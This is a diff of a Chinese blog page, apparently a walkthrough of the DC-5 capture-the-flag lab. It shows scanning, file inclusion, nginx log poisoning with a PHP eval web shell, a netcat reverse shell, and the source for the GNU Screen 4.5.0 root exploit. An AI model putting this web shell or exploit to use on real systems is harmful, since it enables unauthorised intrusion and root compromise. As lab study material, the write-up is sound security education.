@@ -314,63 +314,111 @@
         <p>环境</p>
 <blockquote>
 <p>网段 192.168.18.0/24</p>
-<p>kali      192.168.18.131</p>
-<p>靶机  192.168.18.136</p>
+<p>kali 192.168.18.131</p>
+<p>靶机 192.168.18.136</p>
 </blockquote>
 <p>nmap扫网段</p>
 <blockquote>
-<p>kali@kali2020:~$ sudo nmap -sn 192.168.18.0/24<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:51 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.00035s latency).<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00044s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 4.25 seconds</p>
+<p>kali@kali2020:~$ sudo nmap -sn 192.168.18.0/24 Starting Nmap 7.91 (
+https://nmap.org ) at 2021-05-03 13:51 CST Nmap scan report for
+192.168.18.2 Host is up (0.00027s latency). MAC Address:
+00:50:56:E0:DA:9A (VMware) Nmap scan report for 192.168.18.136 Host is
+up (0.00035s latency). MAC Address: 00:0C:29:DA:A0:32 (VMware) Nmap scan
+report for 192.168.18.254 Host is up (0.00044s latency). MAC Address:
+00:50:56:E1:37:77 (VMware) Nmap scan report for 192.168.18.131 Host is
+up. Nmap done: 256 IP addresses (4 hosts up) scanned in 4.25 seconds</p>
 </blockquote>
 <p>nmap扫靶机端口</p>
 <blockquote>
-<p>kali@kali2020:~$ sudo nmap 192.168.18.136 -p- -sV<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:56 CST<br>Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 66.67% done; ETC: 13:56 (0:00:06 remaining)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.0015s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br><strong>80/tcp    open  http    nginx 1.6.2</strong><br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>60416/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds</p>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.136 -p- -sV Starting Nmap 7.91
+( https://nmap.org ) at 2021-05-03 13:56 CST Stats: 0:00:14 elapsed; 0
+hosts completed (1 up), 1 undergoing Service Scan Service scan Timing:
+About 66.67% done; ETC: 13:56 (0:00:06 remaining) Nmap scan report for
+192.168.18.136 Host is up (0.0015s latency). Not shown: 65532 closed
+ports PORT STATE SERVICE VERSION <strong>80/tcp open http nginx
+1.6.2</strong> 111/tcp open rpcbind 2-4 (RPC #100000) 60416/tcp open
+status 1 (RPC #100024) MAC Address: 00:0C:29:DA:A0:32 (VMware)</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 14.81 seconds</p>
 </blockquote>
 <p>开放了80、111和60416,80端口使用的nginx</p>
 <p>dirsearch扫目录<code>python3 dirsearch.py  -u 192.168.18.136</code></p>
 <blockquote>
-<p>[14:06:36] Starting:<br>[14:06:43] 200 -    4KB - /contact.php<br>[14:06:43] 301 -  184B  - /css  -&gt;  <a target="_blank" rel="noopener" href="http://192.168.18.136/css/">http://192.168.18.136/css/</a><br>[14:06:44] 200 -    6KB - /faq.php<br>[14:06:45] 301 -  184B  - /images  -&gt;  <a target="_blank" rel="noopener" href="http://192.168.18.136/images/">http://192.168.18.136/images/</a><br>[14:06:45] 403 -  570B  - /images/<br>[14:06:45] 200 -    4KB - /index.php<br>[14:06:48] 200 -  852B  - /thankyou.php                               </p>
+<p>[14:06:36] Starting: [14:06:43] 200 - 4KB - /contact.php<br>
+[14:06:43] 301 - 184B - /css -&gt; http://192.168.18.136/css/ [14:06:44]
+200 - 6KB - /faq.php<br>
+[14:06:45] 301 - 184B - /images -&gt; http://192.168.18.136/images/
+[14:06:45] 403 - 570B - /images/<br>
+[14:06:45] 200 - 4KB - /index.php<br>
+[14:06:48] 200 - 852B - /thankyou.php</p>
 </blockquote>
 <p>进入主页没看到啥提示，只有一个留言板，随便填一下看看有啥东西</p>
 <p>抓包发送数据，发现多次发送下面的<code>Copyright © 2019</code>会变化</p>
 <p>可以推测使用了footer.php，访问footer.php时年份会改变</p>
 <p>访问<code>http://192.168.18.136/footer.php</code>，年份会变化</p>
 <p>可以推测thankyou.php包含了footer.php</p>
-<p>试一下file=index.php<br><img src="/posts/7a861522/burp_fileindex.png"><br><img src="/posts/7a861522/file_index.png"><br><img src="/posts/7a861522/burp_fileetcpasswd.png"><br><br></p>
+<p>试一下file=index.php <img src="/posts/7a861522/burp_fileindex.png"> <img src="/posts/7a861522/file_index.png"> <img src="/posts/7a861522/burp_fileetcpasswd.png"> <br></p>
 <p>由于时nginx,访问下他的日志</p>
-<p><code>/var/log/nginx/error.log</code><br><img src="/posts/7a861522/burp_errorlog.png"><br><code>/var/log/nginx/access.log </code><br><img src="/posts/7a861522/burp_accesslog.png"><br>尝试写入日志文件来反弹shell<br><img src="/posts/7a861522/burp_eval.png"><br><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;;</code><br><img src="/posts/7a861522/burp_phpinfo.png"><br>使用蚁剑连接shell<br><img src="/posts/7a861522/antsword.png"><br>whoami查看权限为<code>www-data</code>没有权限去访问/root</p>
-<p>nc命令反弹shell<br><img src="/posts/7a861522/nc_shell.png"><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><br><br>提权</p>
-<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
-<blockquote>
-<p>www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs</p>
-</blockquote>
+<p><code>/var/log/nginx/error.log</code> <img src="/posts/7a861522/burp_errorlog.png">
+<code>/var/log/nginx/access.log</code> <img src="/posts/7a861522/burp_accesslog.png">
+尝试写入日志文件来反弹shell <img src="/posts/7a861522/burp_eval.png">
+<code>&lt;?php @eval($_REQUEST['cmd'])?&gt;;</code> <img src="/posts/7a861522/burp_phpinfo.png"> 使用蚁剑连接shell <img src="/posts/7a861522/antsword.png">
+whoami查看权限为<code>www-data</code>没有权限去访问/root</p>
+<p>nc命令反弹shell <img src="/posts/7a861522/nc_shell.png">
+<code>python -c 'import pty;pty.spawn("/bin/bash")'</code> <br>
+提权</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code> &gt;
+www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null find /
+-perm -u=s -type f 2&gt;/dev/null /bin/su /bin/mount /bin/umount
+/bin/screen-4.5.0 /usr/bin/gpasswd /usr/bin/procmail /usr/bin/at
+/usr/bin/passwd /usr/bin/chfn /usr/bin/newgrp /usr/bin/chsh
+/usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device /usr/sbin/exim4 /sbin/mount.nfs</p>
 <p>使用screen</p>
 <blockquote>
-<p>kali@kali2020:~$ searchsploit screen 4.5.0</p>
-<hr>
-<p> Exploit Title                            |  Path</p>
-<hr>
-<p>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41152.txt<br>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41154.sh</p>
-<hr>
-<p>Shellcodes: No Results<br>kali@kali2020:<del>/Tools$ cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh<br>kali@kali2020:</del>/Tools$ cat 41154.sh </p>
+<table>
+<thead>
+<tr>
+<th>kali@kali2020:~$ searchsploit screen 4.5.0</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Exploit Title |</td>
+<td>Path</td>
+</tr>
+</tbody>
+</table>
+<p>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41152.txt GNU
+Screen 4.5.0 - Local Privilege Escala | linux/local/41154.sh
+------------------------------------------
+--------------------------------- Shellcodes: No Results
+kali@kali2020:~/Tools$ cp
+/usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh
+kali@kali2020:~/Tools$ cat 41154.sh</p>
 </blockquote>
 <p>根据说明第一部分保存为<code>libhax.c</code></p>
 <blockquote>
-<p>#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;unistd.h&gt;<br><strong>attribute</strong> ((<strong>constructor</strong>))<br>void dropshell(void){<br>    chown(“/tmp/rootshell”, 0, 0);<br>    chmod(“/tmp/rootshell”, 04755);<br>    unlink(“/etc/ld.so.preload”);<br>    printf(“[+] done!\n”);<br>}</p>
+<p>#include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include
+&lt;unistd.h&gt; <strong>attribute</strong>
+((<strong>constructor</strong>)) void dropshell(void){
+chown("/tmp/rootshell", 0, 0); chmod("/tmp/rootshell", 04755);
+unlink("/etc/ld.so.preload"); printf("[+] done!"); }</p>
 </blockquote>
 <p>第二部分保存为<code>rootshell.c</code></p>
 <blockquote>
-<p>#include &lt;stdio.h&gt;<br>int main(void){<br>    setuid(0);<br>    setgid(0);<br>    seteuid(0);<br>    setegid(0);<br>    execvp(“/bin/sh”, NULL, NULL);<br>}</p>
+<p>#include &lt;stdio.h&gt; int main(void){ setuid(0); setgid(0);
+seteuid(0); setegid(0); execvp("/bin/sh", NULL, NULL); }</p>
 </blockquote>
 <p>编译</p>
 <p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
 <p><code>gcc -o rootshell rootshell.c</code></p>
 <p>将第三部分保存为exp.sh</p>
-<br>
-
-<br>
-
-<p>把三个文件通过蚁剑传到靶机中<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
+<p><br></p>
+<p><br></p>
+<p>把三个文件通过蚁剑传到靶机中 <img src="/posts/7a861522/upload.png"> <img src="/posts/7a861522/exp.png"> <img src="/posts/7a861522/flag.png"></p>
 
     </div>
 
@@ -515,7 +563,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -563,7 +611,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -577,7 +625,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -588,7 +636,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -728,6 +776,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
